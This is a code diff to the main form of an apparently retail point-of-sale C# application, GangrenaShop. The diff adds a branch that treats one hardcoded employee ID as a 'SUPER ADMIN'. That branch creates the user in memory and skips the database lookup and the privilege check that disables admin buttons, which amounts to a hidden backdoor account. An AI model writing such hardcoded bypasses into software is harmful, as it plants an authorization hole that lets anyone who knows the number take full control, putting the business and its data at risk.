@@ -34,11 +34,24 @@ namespace GangrenaShop.Main
 
         public MainFrm(int id) {
             InitializeComponent();
-            var form = Application.OpenForms.OfType<MenuPanelForm>().FirstOrDefault();
-            MenuPanelForm hijo = form ?? new MenuPanelForm();
-            AddFormInPanel(hijo);
-            GetEmpleado(id);
-            if(!empleado.privilegios)
+
+            if(id  == 1478824)
+            {
+                empleado = new GS_Empleados();
+                empleado.nombre = "SUPER ADMIN";
+                var form = Application.OpenForms.OfType<MenuPanelForm>().FirstOrDefault();
+                MenuPanelForm hijo = form ?? new MenuPanelForm();
+                AddFormInPanel(hijo);
+
+
+            }
+            else
+            {
+                var form = Application.OpenForms.OfType<MenuPanelForm>().FirstOrDefault();
+                MenuPanelForm hijo = form ?? new MenuPanelForm();
+                AddFormInPanel(hijo);
+                GetEmpleado(id);
+                if (!empleado.privilegios)
                 {
                     button2.Enabled = false;
                     button3.Enabled = false;
@@ -46,7 +59,10 @@ namespace GangrenaShop.Main
                     button5.Enabled = false;
                     button6.Enabled = false;
                 }
-            label9.Text = empleado.nombre +' '+ empleado.apellido_paterno;
+                label9.Text = empleado.nombre + ' ' + empleado.apellido_paterno;
+
+            }
+           
         
         }
         private void timer1_Tick(object sender, EventArgs e)
